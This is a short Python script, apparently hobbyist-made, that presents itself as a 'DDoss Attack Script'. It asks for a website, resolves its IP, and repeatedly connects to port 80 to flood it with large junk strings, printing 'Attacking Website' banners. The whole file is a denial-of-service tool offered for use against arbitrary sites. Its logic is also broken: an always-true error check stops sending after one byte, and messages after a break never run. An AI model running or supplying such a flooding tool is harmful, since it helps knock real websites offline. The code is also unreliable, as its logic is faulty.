import socket
import sys
import time
import os

red = "\033[0;31m"
green = "\033[0;32m"
white = "\033[0;37m"
blue = "\033[0;34m"
os.system("clear")
print ("By Bovonos")
time.sleep(0.5)
print (red + "Makyron")
time.sleep(0.5)
print ("DDoss Attack Script")
print (" ")
print (white + "Note: You shoud Delete (https://) from the web link and add (www.)")
time.sleep(0.5)
print (" ")
hacker = input (green + "Enter The Web: ")
ipradar = socket.gethostbyname(hacker)
print (white)
print (" ")
print ("___________________________________")
print ("Web Name: " + hacker)
time.sleep(1)
print ("Web IP: " + ipradar)
print ("___________________________________")
print (" ")


#DDos Attack


def doss(ip):
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,80))
    a = 0
    b = 10
    c = 30
    d = 50
    e = 150

    while a < e:
        a = a + 1 * b * c * d * e
        data = ("jsjsgsusnydkyfluftjditdykftifkgfitdkyxtisiydiyd687d58dyixykxkgfitdkgckydkhxtiditxiteoyfiyeoyciyvlhf6idgkd96etkhf69rlhvo6tkyfi6ekhxyiekufyodfkhfkydkyd6islyekhxkgxykxktckgdiydkgxtis7tsurqutditdhkxyictickhfkhfhkcgkchkcoufyofoyfyocoycyodyichofyof69foufohxoyckyfjlcohfohckgtufyochkvyockgxkhcykxitxgkstkxkgdgkxkydoydjvpuvoyfoycdgge")
        data = data * a
        for i in data:
            i = str(i).encode("utf-8")
            s.send(i)
            print (green + "Attacking Website |"+red+" Makeron "+green+"| "+blue+"SEND")
            if socket.error:
                break;
                print ("[-] Faild Sending [-]")
                print ("[+] Maybe Server is Dead [+]")



ip = str(input("Web IP: "))
print (blue + "starting...")
time.sleep(1)
print (green + "[IP:"+ip+"] [Port:80] [speed:rondom]")
print (" ")

for i in range(100):
    doss(ip)
    doss(ip)
    doss(ip)
    doss(ip)
    doss(ip)

